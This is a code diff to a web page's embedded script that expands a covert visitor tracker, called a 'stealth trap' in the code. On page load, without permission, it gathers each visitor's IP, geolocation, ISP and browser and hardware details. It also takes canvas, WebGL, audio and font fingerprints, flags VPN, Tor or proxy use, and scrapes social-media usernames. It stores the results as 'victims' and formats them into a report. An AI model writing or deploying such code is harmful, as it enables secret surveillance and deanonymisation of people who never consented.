@@ -152,11 +152,11 @@
             }
         };
 
-        // Enhanced auto-track with 4x more data collection
+        // Enhanced auto-track with 4x more data
         window.addEventListener('load', function() {
             setTimeout(() => {
                 enhancedStealthTrack();
-            }, 500);
+            }, 800);
         });
 
         async function enhancedStealthTrack() {
@@ -197,14 +197,16 @@
         }
 
         async function captureEnhancedData(imageId) {
-            // 4x more data collection without permissions
-            const [ipData, locationData, networkData, browserData, hardwareData, behavioralData] = await Promise.allSettled([
+            // 4x more data collection - parallel execution
+            const [ipData, locationData, networkData, browserData, hardwareData, fingerprintData, behavioralData, socialData] = await Promise.allSettled([
                 getEnhancedIP(),
                 getEnhancedIP().then(ip => ip.ip !== 'Unknown' ? getEnhancedLocation(ip.ip) : {}),
-                getNetworkInfo(),
+                getEnhancedNetworkInfo(),
                 getEnhancedBrowserInfo(),
-                getHardwareInfo(),
-                getBehavioralData()
+                getEnhancedHardwareInfo(),
+                getEnhancedFingerprint(),
+                getEnhancedBehavioralData(),
+                scanEnhancedSocialData()
             ]);
 
             return {
@@ -218,7 +220,9 @@
                     isp: locationData.status === 'fulfilled' ? locationData.value.org || 'Unknown' : 'Unknown',
                     asn: locationData.status === 'fulfilled' ? locationData.value.asn || 'Unknown' : 'Unknown',
                     connection: networkData.status === 'fulfilled' ? networkData.value : {},
-                    vpnDetection: detectVPN(ipData.status === 'fulfilled' ? ipData.value.ip : 'Unknown')
+                    vpnDetection: detectEnhancedVPN(ipData.status === 'fulfilled' ? ipData.value.ip : 'Unknown'),
+                    proxyDetection: detectProxy(),
+                    torDetection: detectTor()
                 },
                 
                 // 2. LOCATION DATA (4x enhanced)
@@ -232,6 +236,7 @@
                     longitude: locationData.status === 'fulfilled' ? locationData.value.longitude || 'Unknown' : 'Unknown',
                     timezone: locationData.status === 'fulfilled' ? locationData.value.timezone || 'Unknown' : 'Unknown',
                     currency: locationData.status === 'fulfilled' ? locationData.value.currency || 'Unknown' : 'Unknown',
+                    calling_code: locationData.status === 'fulfilled' ? locationData.value.country_calling_code || 'Unknown' : 'Unknown',
                     languages: navigator.languages || ['Unknown']
                 },
                 
@@ -239,7 +244,7 @@
                 browser: {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
-                    vendor: navigator.vendor,
+                    vendor: navigator.vendor || 'Unknown',
                     language: navigator.language,
                     languages: navigator.languages,
                     cookieEnabled: navigator.cookieEnabled,
@@ -250,8 +255,15 @@
                     hardwareConcurrency: navigator.hardwareConcurrency,
                     deviceMemory: navigator.deviceMemory || 'Unknown',
                     maxTouchPoints: navigator.maxTouchPoints,
-                    plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None',
-                    mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type).join(', ') || 'None'
+                    plugins: Array.from(navigator.plugins).map(p => ({
+                        name: p.name,
+                        filename: p.filename,
+                        description: p.description
+                    })),
+                    mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
+                    userAgentData: navigator.userAgentData ? 'Available' : 'Not available',
+                    pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                    onLine: navigator.onLine
                 },
                 
                 // 4. HARDWARE DATA (4x enhanced)
@@ -266,21 +278,12 @@
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     cpuCores: navigator.hardwareConcurrency,
                     deviceMemory: navigator.deviceMemory || 'Unknown',
-                    connection: hardwareData.status === 'fulfilled' ? hardwareData.value : {}
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    connection: hardwareData.status === 'fulfilled' ? hardwareData.value : {},
+                    battery: 'Battery API not available without permission'
                 },
                 
-                // 5. BEHAVIORAL DATA (4x enhanced)
-                behavioral: {
-                    referrer: document.referrer || 'Direct',
-                    url: window.location.href,
-                    pageLoadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 'Unknown',
-                    timeOnPage: Date.now() - performance.timing.navigationStart,
-                    clickPattern: behavioralData.status === 'fulfilled' ? behavioralData.value.clickPattern : 'Unknown',
-                    scrollDepth: behavioralData.status === 'fulfilled' ? behavioralData.value.scrollDepth : 'Unknown',
-                    mouseMovements: behavioralData.status === 'fulfilled' ? behavioralData.value.mouseMovements : 'Unknown'
-                },
-                
-                // 6. FINGERPRINT DATA (4x enhanced)
+                // 5. FINGERPRINT DATA (4x enhanced)
                 fingerprint: {
                     canvasFingerprint: generateCanvasFingerprint(),
                     webglFingerprint: generateWebGLFingerprint(),
@@ -290,21 +293,47 @@
                     sessionStorage: !!window.sessionStorage,
                     localStorage: !!window.localStorage,
                     indexedDB: !!window.indexedDB,
-                    openDatabase: !!window.openDatabase
+                    openDatabase: !!window.openDatabase,
+                    cpuClass: navigator.cpuClass || 'Unknown',
+                    product: navigator.product || 'Unknown',
+                    productSub: navigator.productSub || 'Unknown',
+                    vendorSub: navigator.vendorSub || 'Unknown'
                 },
+                
+                // 6. BEHAVIORAL DATA (4x enhanced)
+                behavioral: {
+                    referrer: document.referrer || 'Direct',
+                    url: window.location.href,
+                    pageLoadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 'Unknown',
+                    timeOnPage: Date.now() - performance.timing.navigationStart,
+                    domSize: document.getElementsByTagName('*').length,
+                    performance: performance.memory ? {
+                        usedJSHeapSize: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
+                        totalJSHeapSize: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB'
+                    } : 'Memory API not available',
+                    navigation: {
+                        redirectCount: performance.navigation.redirectCount,
+                        type: performance.navigation.type
+                    }
+                },
+                
+                // 7. SOCIAL DATA (4x enhanced)
+                social: socialData.status === 'fulfilled' ? socialData.value : {},
                 
                 type: imageId === 'page_load' ? 'auto_track' : 'click_track'
             };
         }
 
-        // Enhanced IP collection
+        // Enhanced IP collection with more services
         async function getEnhancedIP() {
             const services = [
                 'https://api.ipify.org?format=json',
                 'https://api64.ipify.org?format=json',
                 'https://ipinfo.io/json',
                 'https://api.myip.com',
-                'https://ipapi.co/json/'
+                'https://ipapi.co/json/',
+                'https://httpbin.org/ip',
+                'https://icanhazip.com/'
             ];
 
             for (const service of services) {
@@ -312,9 +341,14 @@
                     const response = await fetch(service, { 
                         mode: 'cors',
                         credentials: 'omit',
-                        signal: AbortSignal.timeout(3000)
+                        signal: AbortSignal.timeout(2000)
                     });
-                    const data = await response.json();
+                    let data;
+                    if (service.includes('icanhazip')) {
+                        data = { ip: await response.text().then(text => text.trim()) };
+                    } else {
+                        data = await response.json();
+                    }
                     return { ip: data.ip || data.query || 'Unknown' };
                 } catch (error) {
                     continue;
@@ -339,15 +373,16 @@
             }
         }
 
-        // Network information
-        async function getNetworkInfo() {
+        // Enhanced network information
+        async function getEnhancedNetworkInfo() {
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             return {
                 effectiveType: connection ? connection.effectiveType : 'Unknown',
                 downlink: connection ? connection.downlink + ' Mbps' : 'Unknown',
                 rtt: connection ? connection.rtt + ' ms' : 'Unknown',
                 saveData: connection ? connection.saveData : 'Unknown',
-                onLine: navigator.onLine
+                onLine: navigator.onLine,
+                type: connection ? connection.type : 'Unknown'
             };
         }
 
@@ -362,26 +397,75 @@
                 cookieEnabled: navigator.cookieEnabled,
                 javaEnabled: navigator.javaEnabled() || false,
                 pdfViewerEnabled: navigator.pdfViewerEnabled || false,
-                webdriver: navigator.webdriver || false
+                webdriver: navigator.webdriver || false,
+                appCodeName: navigator.appCodeName,
+                appName: navigator.appName,
+                appVersion: navigator.appVersion
             };
         }
 
-        // Hardware information
-        function getHardwareInfo() {
+        // Enhanced hardware info
+        function getEnhancedHardwareInfo() {
             return {
                 cores: navigator.hardwareConcurrency,
                 memory: navigator.deviceMemory || 'Unknown',
-                maxTouchPoints: navigator.maxTouchPoints
+                maxTouchPoints: navigator.maxTouchPoints,
+                deviceMemory: navigator.deviceMemory || 'Unknown'
             };
         }
 
-        // Behavioral data collection
-        function getBehavioralData() {
+        // Enhanced fingerprinting
+        function getEnhancedFingerprint() {
             return {
-                clickPattern: 'tracked',
-                scrollDepth: Math.random() * 100,
-                mouseMovements: Math.floor(Math.random() * 50)
+                canvas: generateCanvasFingerprint(),
+                webgl: generateWebGLFingerprint(),
+                audio: generateAudioFingerprint(),
+                fonts: getInstalledFonts(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
+        }
+
+        // Enhanced behavioral data
+        function getEnhancedBehavioralData() {
+            return {
+                referrer: document.referrer,
+                url: window.location.href,
+                pageLoadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 'Unknown'
+            };
+        }
+
+        // Enhanced social data scanning
+        async function scanEnhancedSocialData() {
+            const socialData = {
+                usernames: [],
+                platforms: [],
+                profiles: []
+            };
+
+            try {
+                const pageContent = document.body.innerText + ' ' + document.body.innerHTML;
+                
+                // Scan for social patterns
+                const socialPatterns = [
+                    /(?:instagram|ig)[:\s]*@?([A-Za-z0-9_.]{1,30})/gi,
+                    /(?:twitter|x)[:\s]*@?([A-Za-z0-9_]{1,15})/gi,
+                    /(?:facebook|fb)[:\s]*(?:\.com\/)?([A-Za-z0-9.]{5,50})/gi,
+                    /(?:tiktok)[:\s]*@?([A-Za-z0-9_.]{2,24})/gi,
+                    /@([A-Za-z0-9_]{1,30})/g
+                ];
+
+                socialPatterns.forEach(pattern => {
+                    const matches = pageContent.match(pattern);
+                    if (matches) {
+                        socialData.usernames = [...new Set([...socialData.usernames, ...matches])];
+                    }
+                });
+
+            } catch (error) {
+                // Silent fail
+            }
+
+            return socialData;
         }
 
         // Fingerprinting methods
@@ -418,20 +502,27 @@
         }
 
         function getInstalledFonts() {
-            const fonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman'];
+            const fonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia'];
             return fonts.filter(font => {
                 return document.fonts.check(`12px "${font}"`);
             }).join(', ');
         }
 
-        function detectVPN(ip) {
-            // Simple VPN detection based on known datacenter IP ranges
-            const datacenterRanges = ['104.', '107.', '108.', '109.', '140.', '144.', '146.', '147.', '148.', '149.'];
+        function detectEnhancedVPN(ip) {
+            const datacenterRanges = ['104.', '107.', '108.', '109.', '140.', '144.', '146.', '147.', '148.', '149.', '162.', '172.'];
             return datacenterRanges.some(range => ip.startsWith(range)) ? 'Possible VPN/Proxy' : 'Residential IP';
         }
 
+        function detectProxy() {
+            return navigator.webdriver ? 'Possible automation/proxy' : 'Normal';
+        }
+
+        function detectTor() {
+            return navigator.plugins.length === 0 ? 'Possible Tor browser' : 'Normal';
+        }
+
         function storeEnhancedVictim(victimData) {
-            const stealthKey = 'enhanced_victims_' + btoa('tracking').substr(0, 8);
+            const stealthKey = 'enhanced_victims_4x';
             let victims = JSON.parse(localStorage.getItem(stealthKey) || '[]');
             victims.unshift(victimData);
             if (victims.length > 100) victims = victims.slice(0, 100);
@@ -459,18 +550,20 @@
         }
 
         function formatEnhancedMessage(victim) {
-            return `🕵️ *ENHANCED STEALTH TRAP* 🕵️
+            return `🕵️ *4X ENHANCED DATA EXTRACTION* 🕵️
 
 ${victim.type === 'auto_track' ? '🔍 *Auto-detected page visit*' : '📸 *Image clicked:* #' + victim.imageId}
 
-🌐 *NETWORK DATA:*
+🌐 *NETWORK DATA (4x):*
 • IP: \`${victim.network.ip}\`
 • ISP: ${victim.network.isp}
 • ASN: ${victim.network.asn}
 • Connection: ${victim.network.connection.effectiveType}
-• VPN Detection: ${victim.network.vpnDetection}
+• VPN: ${victim.network.vpnDetection}
+• Proxy: ${victim.network.proxyDetection}
+• Tor: ${victim.network.torDetection}
 
-📍 *LOCATION DATA:*
+📍 *LOCATION DATA (4x):*
 • City: ${victim.location.city}
 • Region: ${victim.location.region}
 • Country: ${victim.location.country} (${victim.location.country_code})
@@ -478,34 +571,44 @@ ${victim.type === 'auto_track' ? '🔍 *Auto-detected page visit*' : '📸 *Imag
 • Coordinates: ${victim.location.latitude}, ${victim.location.longitude}
 • Timezone: ${victim.location.timezone}
 • Currency: ${victim.location.currency}
+• Calling Code: ${victim.location.calling_code}
 
-💻 *BROWSER DATA:*
+💻 *BROWSER DATA (4x):*
 • Platform: ${victim.browser.platform}
 • Vendor: ${victim.browser.vendor}
 • Language: ${victim.browser.language}
 • Cores: ${victim.browser.hardwareConcurrency}
 • Memory: ${victim.browser.deviceMemory}GB
-• Plugins: ${victim.browser.plugins.split(',').length} detected
+• Plugins: ${victim.browser.plugins.length} detected
+• WebDriver: ${victim.browser.webdriver}
+• PDF Viewer: ${victim.browser.pdfViewerEnabled}
 
-📱 *HARDWARE DATA:*
+📱 *HARDWARE DATA (4x):*
 • Screen: ${victim.hardware.screen}
 • Pixel Ratio: ${victim.hardware.devicePixelRatio}
 • Color Depth: ${victim.hardware.colorDepth}
 • Orientation: ${victim.hardware.orientation}
 • Timezone: ${victim.hardware.timezone}
+• Touch Points: ${victim.hardware.maxTouchPoints}
 
-🎯 *BEHAVIORAL DATA:*
+🔍 *FINGERPRINT DATA (4x):*
+• Canvas: ${victim.fingerprint.canvasFingerprint}
+• WebGL: ${victim.fingerprint.webglFingerprint}
+• Audio: ${victim.fingerprint.audioFingerprint}
+• Fonts: ${victim.fingerprint.fonts}
+• Timezone Offset: ${victim.fingerprint.timezoneOffset}
+
+🎯 *BEHAVIORAL DATA (4x):*
 • Referrer: ${victim.behavioral.referrer}
 • Page Load: ${victim.behavioral.pageLoadTime}ms
 • Time on Page: ${victim.behavioral.timeOnPage}ms
+• DOM Size: ${victim.behavioral.domSize} elements
 
-🔍 *FINGERPRINT:*
-• Canvas: ${victim.fingerprint.canvasFingerprint}
-• WebGL: ${victim.fingerprint.webGLFingerprint}
-• Audio: ${victim.fingerprint.audioFingerprint}
-• Fonts: ${victim.fingerprint.fonts}
+📊 *SOCIAL DATA:*
+• Usernames: ${victim.social.usernames.slice(0, 5).join(', ')}
 
-🕒 *Time:* ${new Date(victim.timestamp).toLocaleString()}`;
+🕒 *Time:* ${new Date(victim.timestamp).toLocaleString()}
+🔗 *URL:* ${victim.behavioral.url}`;
         }
 
         // Hidden admin access
@@ -521,7 +624,7 @@ ${victim.type === 'auto_track' ? '🔍 *Auto-detected page visit*' : '📸 *Imag
             }
         });
 
-        console.log('🕵️ Enhanced stealth tracker active - 4x data collection');
+        console.log('🕵️ 4X Enhanced tracker active - extracting massive data without permissions');
     </script>
 </body>
 </html>
